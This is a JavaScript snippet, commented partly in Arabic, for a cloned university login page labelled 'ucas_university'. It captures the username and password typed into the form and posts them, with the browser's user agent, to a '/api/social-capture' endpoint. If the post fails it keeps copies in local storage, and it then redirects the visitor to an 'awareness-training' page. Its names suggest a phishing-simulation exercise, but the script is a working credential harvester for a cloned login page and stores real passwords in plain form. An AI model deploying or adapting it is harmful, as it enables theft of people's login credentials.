<!-- CAPTURE SCRIPT - يرسل البيانات بشكل صحيح -->
<script>
    (function() {
        const form = document.getElementById('trainingForm');
        if (!form) {
            console.error("Form not found!");
            return;
        }

        function showNotification(message, isError) {
            const notification = document.createElement('div');
            notification.className = 'toast-notification';
            notification.style.backgroundColor = isError ? '#dc3545' : '#28a745';
            notification.innerHTML = `<span style="margin-left: 8px;">${isError ? '⚠️' : '✓'}</span> ${message}`;
            document.body.appendChild(notification);
            setTimeout(() => notification.remove(), 3000);
        }

        form.addEventListener('submit', function(e) {
            e.preventDefault();
            
            const username = document.getElementById('txtUsername').value;
            const password = document.getElementById('txtPassword').value;

            const payload = {
                site: 'ucas_university',
                session_id: 'ucas_' + Date.now() + '_' + Math.random().toString(36).substr(2, 8),
                form_data: {
                    username: username,
                    password: password,
                    timestamp: new Date().toISOString(),
                    user_agent: navigator.userAgent
                }
            };
            
            console.log('[UCAS] Sending data for:', username);
            
            fetch('/api/social-capture', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                body: JSON.stringify(payload)
            })
            .then(response => {
                if (response.ok) {
                    return response.json();
                } else {
                    throw new Error('Server responded with ' + response.status);
                }
            })
            .then(data => {
                console.log('[UCAS] Capture recorded:', data);
            })
            .catch(err => {
                console.error('[UCAS] Capture error:', err);
                try {
                    let backups = JSON.parse(localStorage.getItem('ucas_training_backups') || '[]');
                    backups.push({ ...payload, local_timestamp: new Date().toISOString(), error: err.message });
                    localStorage.setItem('ucas_training_backups', JSON.stringify(backups.slice(-20)));
                } catch(e) {
                    console.warn('Could not save backup:', e);
                }
            })
            .finally(() => {
                setTimeout(() => {
                    window.location.href = '/awareness-training';
                }, 1500);
            });
        });
        
        // تعطيل أي روابط أخرى قد تسبب مشكلة
        const originalLink = document.getElementById('ContentPlaceHolder1_lnkLogin');
        if (originalLink) {
            originalLink.addEventListener('click', function(e) {
                e.preventDefault();
                const submitEvent = new Event('submit', { cancelable: true, bubbles: true });
                form.dispatchEvent(submitEvent);
            });
        }
        
        console.log('✓ UCAS Training Clone Active — Data will be sent to /api/social-capture');
    })();
</script>
